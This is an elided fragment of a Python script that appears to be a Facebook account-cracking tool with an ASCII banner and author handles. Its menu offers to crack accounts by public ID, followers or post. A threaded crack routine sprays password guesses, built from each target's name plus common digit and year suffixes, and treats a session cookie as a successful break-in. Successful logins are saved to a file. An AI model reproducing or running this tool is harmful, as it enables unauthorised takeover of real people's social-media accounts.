...
\033[1;34m>=>    >=>  >>=       =>>     >=>   >=>        >=>   >=>
\033[1;34m  >=>>=>   >=>         >=>     >=>>=>           >=>>=>
\033[1;31m[ Github : https://github.com/saw4x ]
\033[1;37m[ TELEGRAM : @SAWx404 ]
\033[1;34m[ instagram : 127.0.2 ]"""%(BM)))
		print(
			"""
	[1] = \033[1;31m CRACK WITH PUBLIC ID
	[2] = \033[1;37m CRACK SAW FOLLOWERS
	[4] = \033[1;37m CRACK WITH POST
	[3] = \033[1;34m CHECK CHECKPOINT / SUCCESFULL
	[0] = \033[1;37m Logout]
			"""
		)
		chose = input("  Chooice: ")
		...
		if chose=='1' or chose=='2':
			...
			account_target = input(" ID Facebook : ")
			try:
			...
			try:
				...
				for x in open('/sdcard/succesfull.txt','r').readlines():
					print(f' > {x}')
	...
	def crack(self, user, password_list, url):
		...
		for pw in password_list:
			...
			if "c_user" in session.cookies.get_dict():
				...
				opsi.clear()
				break
			sys.stdout.write("\r\033[1;97m[SAW] %s/%s\033[1;92mOK|\033[1;91mCP:%s/%s"%(len(loop),len(data_id),len(ok),len(cp)))
			sys.stdout.flush()
		loop.append("memek")
...
class Assets(Main):
	...
	@property
	def validate(self):
		add = input(" [y/n] AUTO PASSWORD? ")
		if add=="y":
			pas = self._password_split
		print(
			"\033[1;91m CRACK IS STARTING PLEASE WAIT 15min _ 30min\n"
		)
		...
		with ThreadPoolExecutor(max_workers=35) as kirim:
			for x in self.data_id:
				...
				name = namee.split(" ")
				if(len(name[0])>=6):
					__password_list = [namee,name[0]+'123',name[0]+'111222',name[0]+'123123',name[0]+'100200',name[0]+'1000',name[0]+'112233',name[0]+'22334455',name[0]+'223344',name[0]+'1234',name[0]+'12345',name[0]+'123456789',name[0]+'112233',name[0]+'321',name[0]+'4321',name[0]+'123123',name[0]+'123321',name[0]+'12341234',name[0]+'123456',name[0]+'12345678',name[0]+'1234567',name[0]+'2003',name[0]+'123@',name[0]+'1234@',name[0]+'12345@123@',name[0]+'1122',name[0]+'11',name[0]+'12',name[0]+'10',name[0]+'11223344',name[0]+'1122334455',name[0]+'112233445566',name[0]+'1980',name[0]+'1981',name[0]+'1982',name[0]+'1983',name[0]+'1984',name[0]+'1985',name[0]+'1986',name[0]+'1987',name[0]+'1988',name[0]+'1989',name[0]+'1990',name[0]+'1991',name[0]+'1992',name[0]+'1993',name[0]+'1994',name[0]+'1995',name[0]+'1996',name[0]+'1997',name[0]+'1998',name[0]+'1999',name[0]+'2000',name[0]+'2001',name[0]+'2002',name[0]+'2003',name[0]+'2004',name[0]+'2005',name[0]+'2006',name[0]+'2007',name[0]+'2008',name[0]+'2009',name[0]+'2010',name[0]+'2011',name[0]+'2012',name[0]+'2013',name[0]+'2014',name[0]+'2015',name[0]+'2016',name[0]+'2017',name[0]+'2018',name[0]+'2019',name[0]+'2020',name[0]+'2021',name[0]+'2022',name[0]+'2023',name[0]+'2024',name[0]+'2000@0',name[0]+'1234445',name[0]+'964@',name[0]+'964#',name[0]+'964$',name[0]+'964@@',name[0]+'0750',name[0]+'0751',name[0]+'0752']
				elif(len(name[0])<=2):
					__password_list = [namee,name[0]+'123',name[0]+'111222',name[0]+'123123',name[0]+'100200',name[0]+'1000',name[0]+'112233',name[0]+'22334455',name[0]+'223344',name[0]+'1234',name[0]+'12345',name[0]+'123456789',name[0]+'112233',name[0]+'321',name[0]+'4321',name[0]+'123123',name[0]+'123321',name[0]+'12341234',name[0]+'123456',name[0]+'12345678',name[0]+'1234567',name[0]+'2003',name[0]+'123@',name[0]+'1234@',name[0]+'12345@123@',name[0]+'1122',name[0]+'11',name[0]+'12',name[0]+'10',name[0]+'11223344',name[0]+'1122334455',name[0]+'112233445566',name[0]+'1980',name[0]+'1981',name[0]+'1982',name[0]+'1983',name[0]+'1984',name[0]+'1985',name[0]+'1986',name[0]+'1987',name[0]+'1988',name[0]+'1989',name[0]+'1990',name[0]+'1991',name[0]+'1992',name[0]+'1993',name[0]+'1994',name[0]+'1995',name[0]+'1996',name[0]+'1997',name[0]+'1998',name[0]+'1999',name[0]+'2000',name[0]+'2001',name[0]+'2002',name[0]+'2003',name[0]+'2004',name[0]+'2005',name[0]+'2006',name[0]+'2007',name[0]+'2008',name[0]+'2009',name[0]+'2010',name[0]+'2011',name[0]+'2012',name[0]+'2013',name[0]+'2014',name[0]+'2015',name[0]+'2016',name[0]+'2017',name[0]+'2018',name[0]+'2019',name[0]+'2020',name[0]+'2021',name[0]+'2022',name[0]+'2023',name[0]+'2024',name[0]+'2000@0',name[0]+'1234445',name[0]+'964@',name[0]+'964#',name[0]+'964$',name[0]+'964@@',name[0]+'0750',name[0]+'0751',name[0]+'0752']
				else:
					__password_list = [namee,name[0]+'123',name[0]+'111222',name[0]+'123123',name[0]+'100200',name[0]+'1000',name[0]+'112233',name[0]+'22334455',name[0]+'223344',name[0]+'1234',name[0]+'12345',name[0]+'123456789',name[0]+'112233',name[0]+'321',name[0]+'4321',name[0]+'123123',name[0]+'123321',name[0]+'12341234',name[0]+'123456',name[0]+'12345678',name[0]+'1234567',name[0]+'2003',name[0]+'123@',name[0]+'1234@',name[0]+'12345@123@',name[0]+'1122',name[0]+'11',name[0]+'12',name[0]+'10',name[0]+'11223344',name[0]+'1122334455',name[0]+'112233445566',name[0]+'1980',name[0]+'1981',name[0]+'1982',name[0]+'1983',name[0]+'1984',name[0]+'1985',name[0]+'1986',name[0]+'1987',name[0]+'1988',name[0]+'1989',name[0]+'1990',name[0]+'1991',name[0]+'1992',name[0]+'1993',name[0]+'1994',name[0]+'1995',name[0]+'1996',name[0]+'1997',name[0]+'1998',name[0]+'1999',name[0]+'2000',name[0]+'2001',name[0]+'2002',name[0]+'2003',name[0]+'2004',name[0]+'2005',name[0]+'2006',name[0]+'2007',name[0]+'2008',name[0]+'2009',name[0]+'2010',name[0]+'2011',name[0]+'2012',name[0]+'2013',name[0]+'2014',name[0]+'2015',name[0]+'2016',name[0]+'2017',name[0]+'2018',name[0]+'2019',name[0]+'2020',name[0]+'2021',name[0]+'2022',name[0]+'2023',name[0]+'2024',name[0]+'2000@0',name[0]+'1234445',name[0]+'964@',name[0]+'964#',name[0]+'964$',name[0]+'964@@',name[0]+'0750',name[0]+'0751',name[0]+'0752']
